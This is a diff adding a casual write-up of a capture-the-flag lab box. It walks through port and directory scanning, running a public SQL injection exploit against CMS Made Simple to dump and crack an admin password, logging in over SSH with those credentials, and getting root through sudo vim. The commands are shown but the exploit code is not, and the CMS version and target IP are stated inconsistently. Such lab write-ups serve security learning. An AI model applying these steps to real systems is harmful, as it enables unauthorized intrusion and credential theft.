@@ -1,0 +1,68 @@
+so first i started with enumerating the ports
+
+by using rustscan 
+
+
+ $rustscan -a 10.10.61.207
+
+
+Open 10.10.61.207:21
+Open 10.10.61.207:80
+Open 10.10.61.207:2222
+
+after that i started enumerating the ports and started a gobuster scan on port 80
+
+gobuster -u http://10.10.61.207 -w /wordlist -x php,txt,html -t 100
+
+i found the cms directory /simple 
+and from there i found the version of the cms that was in the end cms ver 2.8.8
+
+to get the admin panel i started again gobuster scan on the port 80 in the /simple directory where i found the /admin dir
+
+i started for looking the exploit of cms 2.2.8 on exploit db
+
+and found it
+
+https://www.exploit-db.com/exploits/46635
+
+after that downloads it and made some edits like chaging
+#!/usr/bin/env python --> #!/usr/bin/python
+
+and to remove the badinterpreter i did this
+
+sed -i -e 's/\r$//' scriptname.sh
+
+
+this removed the error after that i executed the script
+
+python2 46635.py  -u http://10.10.168.60/simple -c -w /home/duck/Desktop/payloads/wordlist/best110.txt
+
+
+this was very buggy idk why 
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+[+] Password cracked: secret
+
+
+after this i cracked the password by hashcat
+
+using salt+hash or hash+salt by using module 20 or 10
+
+the password by secret
+
+
+i tried to hack using the cms but was not able to hack it idk why
+
+then i opened up a walkthrough coz i was frustated (the exploit was very glitchy dammmm ! )
+
+
+i saw we can login into ssh by using the creds got!
+
+and by sudo -l saw vim was given sudo perms 
+
+just opened gtfobins and searched for sudo vim and got the root!
+
+cheers
